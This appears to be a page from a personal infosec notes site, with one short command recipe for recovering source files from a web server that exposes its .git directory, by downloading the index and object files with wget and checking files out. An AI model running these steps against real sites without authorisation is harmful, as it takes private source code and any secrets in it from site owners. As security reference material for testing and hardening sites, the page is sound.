---
layout: page

title: Short Notes

category: infosec
see_my_category_in_header: true

permalink: /infosec/unstructured_notes.html

published: true
---

<article class="markdown-body" markdown="1">

## Content
<div class="spoiler"><div class="spoiler-title">
    <i>Table of contents</i>
</div><div class="spoiler-text" markdown="1">

* TOC
{:toc}

</div>
</div>

## Git repo disembowel

    git init
    wget http://example.com/.git/index -O .git/index
    
    git ls-files
        # Listing of git files
    
    git checkout interest-file.txt
        # error with file hash: 01d355b24a38cd5972d1317b9a2e7f6218e15231

    wget http://example.com/.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy -O .git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

    git checkout interest-file.txt

    # You have file

</article>
